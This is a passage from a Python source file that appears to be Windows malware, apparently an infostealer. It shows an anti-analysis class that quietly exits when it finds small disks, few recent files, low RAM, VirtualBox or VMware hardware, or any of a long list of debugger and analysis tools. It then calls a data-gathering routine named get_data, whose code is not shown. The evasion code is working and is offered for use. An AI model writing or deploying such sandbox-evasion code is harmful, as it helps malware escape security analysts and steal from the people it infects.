            total_disk_space_gb = sum(psutil.disk_usage(drive.mountpoint).total for drive in psutil.disk_partitions()) / (1024 ** 3)
            if total_disk_space_gb < 50:
                ctypes.windll.kernel32.ExitProcess(0)
            min_disk_space_gb = 50
            if len(sys.argv) > 1:
                min_disk_space_gb = float(sys.argv[1])
            free_space_gb = win32api.GetDiskFreeSpaceEx()[1] / 1073741824
            if free_space_gb < min_disk_space_gb:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"anti vm disk space error - {str(e)}")

    async def check_recent_files(self) -> bool:
        try:
            recent_files_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent')
            if len(os.listdir(recent_files_folder)) < 20:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"check recent files error - {str(e)}")

    async def check_process_count(self) -> None:
        try:
            if len(psutil.pids()) < 50:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"process count error - {str(e)}")

    async def check_virtual_memory(self) -> None:
        try:
            total_memory_gb = psutil.virtual_memory().total / (1024 ** 3)
            if total_memory_gb < 6:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"virtual memory error - {str(e)}")

    async def check_for_virtualization(self) -> None:
        try:
            process = await asyncio.create_subprocess_shell('wmic path win32_VideoController get name',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout, stderr = await process.communicate()
            video_controller_info = stdout.decode(errors='ignore').splitlines()
            if any(x.lower() in video_controller_info[2].strip().lower() for x in ("virtualbox", "vmware")):
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"virtualization error - {str(e)}")

    async def check_for_suspicious_files(self) -> None:
        try:
            temp_file_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'JSAMSIProvider64.dll')
            if os.path.exists(temp_file_path):
                ctypes.windll.kernel32.ExitProcess(0)
            try:
                machine_name = platform.uname().machine.lower()
                if "dady harddisk" in machine_name or "qemu harddisk" in machine_name:
                    ctypes.windll.kernel32.ExitProcess(0)
            except AttributeError:
                pass

            suspicious_process_names = ["32dbg", "64dbgx", "autoruns", "autoruns64", "autorunsc", "autorunsc64", "ciscodump", "df5serv", "die", "dumpcap", "efsdump", "etwdump", "fakenet", "fiddler", "filemon", "hookexplorer", "httpdebugger", "httpdebuggerui", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idau", "idau64", "idaw", "immunitydebugger", "importrec", "joeboxcontrol", "joeboxserver", "ksdumperclient", "lordpe", "ollydbg", "pestudio", "petools", "portmon", "prl_cc", "prl_tools", "proc_analyzer", "processhacker", "procexp", "procexp64", "procmon", "procmon64", "qemu-ga", "qga", "regmon", "reshacker", "resourcehacker", "sandman", "sbiesvc", "scylla", "scylla_x64", "scylla_x86", "sniff_hit", "sysanalyzer", "sysinspector", "sysmon", "tcpdump", "tcpview", "tcpview64", "udpdump", "vboxcontrol", "vboxservice", "vboxtray", "vgauthservice", "vm3dservice", "vmacthlp", "vmsrvc", "vmtoolsd", "vmusrvc", "vmwaretray", "vmwareuser", "vt-windows-event-stream", "windbg", "wireshark", "x32dbg", "x64dbg", "x96dbg", "xenservice"]
          
            running_processes = [
                process.name().lower() for process in psutil.process_iter(attrs=['name']) 
                if process.name().lower() in suspicious_process_names
            ]
            if running_processes:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"sus files error - {str(e)}")

    async def check_system_manufacturer(self) -> None:
        try:
            process1 = await asyncio.create_subprocess_shell('wmic computersystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout1, stderr1 = await process1.communicate()

            process2 = await asyncio.create_subprocess_shell('wmic path Win32_ComputerSystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout2, stderr2 = await process2.communicate()

            if b'VMware' in stdout1 or b"vmware" in stdout2.lower():
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"manufacturer error - {str(e)}")


        
if __name__ == '__main__':
    if os.name == "nt":
        anti = anti_vm()
        asyncio.run(anti.run_all_fonctions())

        main = get_data()
        asyncio.run(main.RunAllFonctions())
    else:
        print('run only on windows operating system')
